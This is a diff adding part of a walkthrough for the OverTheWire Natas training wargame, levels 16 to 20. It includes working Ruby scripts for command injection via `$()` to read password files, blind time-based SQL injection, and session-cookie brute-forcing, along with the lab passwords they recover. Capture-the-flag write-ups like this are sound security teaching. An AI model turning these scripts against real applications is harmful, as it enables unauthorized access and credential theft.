@@ -352,6 +352,187 @@ Looking at the source code for this one, we see that our input is getting `passt
 password file...oh wait, our input is getting sanitized. We can't use `;` or `&` to terminate/chain 
 commands. So what can we do to bypass the filter?
 
+Well one thing they aren't filtering is these characters: `$()`
+
+This is how we can do nested commands in bash. So if we did this for example:
+
+`Americans$(grep -i a /etc/natas_webpass/natas17)`
+
+Our query would only return "Americans" if the letter "a" was not in the password for natas17.
+
+So we can make a script to brute force this thing. Assuming 32 character password like all the 
+other levels:
+
+```ruby
+require 'net/http'
+
+allChars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
+password = ""
+32.times do |i|
+  allChars.each do |c|
+    uri = URI.parse("http://natas16.natas.labs.overthewire.org/index.php")
+    params = {'needle' => "Americans$(grep ^#{password + c} /etc/natas_webpass/natas17)"}
+    http = Net::HTTP.new(uri.host,uri.port)
+    req = Net::HTTP::Get.new(uri.path)
+    req.basic_auth("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
+    req.set_form_data(params)
+
+    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
+    req.basic_auth("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
+
+    resp = http.request(req)
+    unless resp.body.include?("Americans")
+      password += c
+      break
+    end
+  end
+  puts "Password (#{i}/32): #{password}"
+end
+```
+
+Password for *natas17*: **8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw**
+
+## Natas 17
+
+**user:** *natas17*  
+**pass:** *8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw*  
+**url:** [http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org)
+
+So looking at the source code, we got a form that's vulnerable to SQL injection.
+
+But wait...what? Whatever I input, I get back a basically empty page?
+
+If you look closely at the PHP code, all output is commented out. That means there is 
+no way to know what the query returns. This is a truly Blind SQL injection. The only thing 
+we can go off of is how long it takes for the query to execute.
+
+We can tell the query to `sleep()` for a few seconds if a condition is true. Then if we 
+notice that the query took longer (ie. it slept), we know that our query condition was true.
+
+If we use this query: `natas18" and sleep(10)-- `
+
+The query will sleep for 10 seconds before returning.
+
+We can use this to exfiltrate data.
+
+```ruby
+require 'net/http'
+
+allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+pass = ""
+32.times do |i|
+  allChars.split("").each do |c|
+    uri = URI.parse("http://natas17.natas.labs.overthewire.org/index.php")
+    params = {'username' => "natas18\" AND password LIKE BINARY \"#{pass + c}%\" AND sleep(2)-- "}                                                                                                            http = Net::HTTP.new(uri.host,uri.port)
+    req = Net::HTTP::Get.new(uri.path)
+    req.basic_auth("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
+    req.set_form_data(params)
+
+    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
+    req.basic_auth("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
+                                                                                                                                                                                                              start_time = Time.now
+    resp = http.request(req)
+    total_time = Time.now - start_time
+    if total_time > 2
+      pass += c
+      puts "(#{pass.length}/32) => #{pass}"
+      break
+    end
+  end
+end
+
+
+puts "Password for Level 18: #{pass}"
+```
+
+Password for *natas18*: **xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP**
+
+## Natas 18
+
+**user:** *natas18*  
+**pass:** *xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP*  
+**url:** [http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org)
+
+If we look at the source code, it looks like the only authentication it is doing is checking 
+the `PHPSESSID` cookie to see if it is the admins and since we only have to check a max of 
+640 ids we should be able to brute force this thing in less than a minute.
+
+```ruby
+require 'net/http'
+
+print "Attempting: "
+641.times do |i|
+  print "#{i},"
+  uri = URI.parse("http://natas18.natas.labs.overthewire.org/index.php")
+  http = Net::HTTP.new(uri.host,uri.port)
+
+  header = { 'Cookie' => "PHPSESSID=#{i}" }
+  req = Net::HTTP::Post.new(uri.path, header)
+  req.basic_auth("natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
+
+  resp = http.request(req)
+  if resp.body.include?("You are an admin")
+    puts resp.body
+    break
+  end
+end
+```
+
+Password for *natas19*: **4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs**
+
+## Natas 19
+
+**user:** *natas19*  
+**pass:** *4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs*  
+**url:** [http://natas19.natas.labs.overthewire.org](http://natas19.natas.labs.overthewire.org)
+
+This level says that it uses most of the same code but that "sessions ids are no longer sequential".
+
+That shouldn't matter for our script. I do wonder if they only go up to 640 though? They apparently don't 
+because if we just log in with a blank form our `PHPSESSID=3535392d`. So this could take a little longer.
+
+But let's generate a few to see if there is any pattern...
+
+With username `admin` and a random password. These are starting to look a lot like hex. Let's 
+convert this to ASCII. AHA! It is hex! Our last session id is `254-admin` in ascii.
+
+So we probably have the old sequential id plus a hyphen plus the username. Now we can brute 
+force that easy!
+
+```ruby
+require 'net/http'
+
+print "Attempting: "
+641.times do |i|
+  attempt = "#{i}-admin".each_byte.map{|b| b.to_s(16)}.join
+  print "#{attempt},"
+  uri = URI.parse("http://natas19.natas.labs.overthewire.org/index.php")
+  http = Net::HTTP.new(uri.host,uri.port)
+
+  header = { 'Cookie' => "PHPSESSID=#{attempt}" }
+  req = Net::HTTP::Post.new(uri.path, header)
+  req.basic_auth("natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
+
+  resp = http.request(req)
+  if resp.body.include?("You are an admin")
+    puts resp.body
+    break
+  end
+end
+```
+
+Password for *natas20*: **eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF**
+
+## Natas 20
+
+**user:** *natas20*  
+**pass:** *eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF*  
+**url:** [http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
+
+
+
+
+
 
 
 
